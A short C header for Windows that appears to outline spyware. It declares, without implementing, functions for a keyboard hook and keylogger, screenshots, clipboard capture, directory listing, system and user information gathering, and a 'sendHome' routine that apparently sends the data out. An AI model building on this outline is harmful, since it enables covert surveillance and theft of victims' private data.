#include <Windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <stdio.h>

#define DIV 10737418

PBITMAPINFO createBitmapInfo(HBITMAP);
LRESULT CALLBACK keyboardHook(int, WPARAM, LPARAM);

int listDir(STRSAFE_LPCWSTR, STRSAFE_LPCWSTR, STRSAFE_LPCWSTR, int);
int list();

void createBMPFile(LPTSTR, PBITMAPINFO, HBITMAP, HDC);
void sendHome(char*);

void clipboard();
void getUserInfo();  
void getMemoryUsage();
void getSystemInfo();
void keylogger();
void screenshot();
void getIntel();